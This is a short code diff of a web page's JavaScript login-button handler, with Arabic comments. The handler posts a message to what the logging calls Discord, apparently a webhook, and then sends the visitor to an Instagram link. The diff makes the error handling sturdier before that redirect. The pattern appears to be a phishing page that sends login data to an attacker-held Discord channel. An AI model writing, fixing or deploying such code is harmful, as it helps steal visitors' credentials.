@@ -21,12 +21,17 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
     },
     body: JSON.stringify(message)
   })
-  .then(response => response.json())
+  .then(response => response.text())  // تغيير من response.json() إلى response.text()
   .then(data => {
-    console.log("Message sent successfully:", data);
+    console.log("Response from Discord:", data);
     
-    // إعادة التوجيه بعد نجاح الإرسال
-    window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
+    // التحقق مما إذا كان الإرسال ناجحًا
+    if (data.includes("error") || data.includes("Invalid")) {
+      console.error("Error detected in response:", data);
+    } else {
+      console.log("Message sent successfully");
+      window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
+    }
   })
   .catch(error => {
     console.error("Error sending message:", error);
